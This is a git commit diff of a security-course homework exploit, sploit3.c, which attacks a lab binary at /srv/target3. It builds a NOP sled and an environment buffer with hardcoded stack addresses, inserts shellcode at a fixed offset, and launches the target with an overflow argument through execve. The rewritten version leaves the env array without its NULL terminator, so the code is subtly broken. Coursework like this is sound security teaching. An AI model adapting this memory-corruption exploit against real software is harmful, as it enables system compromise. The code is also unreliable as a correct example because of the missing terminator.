fcc0aadc94e00b68afe819e0f5d49f7490b84a4f
justinhalford <justinhalford@gmail.com>
2024-05-10 18:32:49 -0400

    may 7

--- cs5435-hw4/sploits/sploit3.c
+++ cs5435-hw4/sploits/sploit3.c
@@ -7,36 +7,32 @@
 
 #define TARGET "/srv/target3"
 
-const int BUFFER_SIZE = 400;
-const int SHELLCODE_OFFSET = 201;
-const uint32_t BASE_ADDRESS = 0xffffdec0;
+int main(void) {
+    char *args[] = {
+        TARGET,
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
+        NULL
+    };
 
-void prepareEnvironment(char *environment) {
-    memset(environment, 0x90, BUFFER_SIZE - 1);
+    static char environment[400] = {0};
+    uint32_t base_address = 0xffffdec0;
 
-    *((uint32_t *)(environment)) = BASE_ADDRESS + 4;
-    *((uint32_t *)(environment + 4)) = BASE_ADDRESS + 8;
+    // Fill the environment buffer with NOPs
+    memset(environment, 0x90, sizeof(environment) - 1);
 
-    memcpy(environment + SHELLCODE_OFFSET, shellcode, sizeof(shellcode));
-}
+    // Adjust return address in the environment
+    *((uint32_t *)(environment)) = base_address + 4;
+    *((uint32_t *)(environment + 4)) = base_address + 8;
 
-int main(void)
-{
-    char *args[3];
-    char *env[2];
-    char environment[BUFFER_SIZE];
+    // Copy the shellcode to a specific offset within the environment
+    memcpy(environment + 201, shellcode, sizeof(shellcode));
 
-    prepareEnvironment(environment);
+    char *env[] = {environment};
 
-    //test
-    args[0] = TARGET;
-    args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
-    args[2] = NULL;
-
-    env[0] = environment;
-    env[1] = NULL;
-
+    // Attempt to execute the target binary with the crafted arguments and environment
     execve(TARGET, args, env);
+
+    // If execve fails, print an error message
     fprintf(stderr, "execve failed.\n");
 
     return 0;
